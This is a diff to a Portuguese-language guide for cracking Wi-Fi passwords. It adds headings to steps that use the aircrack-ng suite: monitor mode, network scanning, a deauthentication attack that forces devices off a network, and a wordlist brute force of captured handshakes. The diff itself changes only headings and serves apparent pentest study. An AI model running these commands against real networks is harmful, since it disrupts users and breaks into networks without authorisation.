@@ -67,7 +67,7 @@ sudo airmon-ng start wlan0
 ```bash
 sudo iwconfig
 ```
-#### 
+#### Scanning da Rede
 - Realize o scan das redes próximas e tome nota do BSSID e Channel da rede alvo:
 ```bash
 sudo airodump-ng wlan0mon
@@ -76,10 +76,12 @@ sudo airodump-ng wlan0mon
 ```bash
 sudo airodump-ng -c <CANAL_DA_REDE> --bssid <BSSID_DA_REDE> -w <PREFIXO_DO_ARQUIVO_DE_OUTPUT> wlan0mon
 ```
+#### Deauthentication
 - Em outro terminal, enquanto o outro roda o comando anterior, expulse os hosts da rede por meio de um ataque de deauthentication:
 ```bash
 sudo aireplay-ng -0 2 -a <BSSID_DA_REDE> -c <MAC_DO_DISPOSITIVO>
 ```
+#### Brute Force
 - Realize um ataque de força bruta nos pacotes capturados para tentar realizar a quebra da senha:
 ```bash
 sudo aircrack-ng <ARQUIVO>.cap -w <WORDLIST>
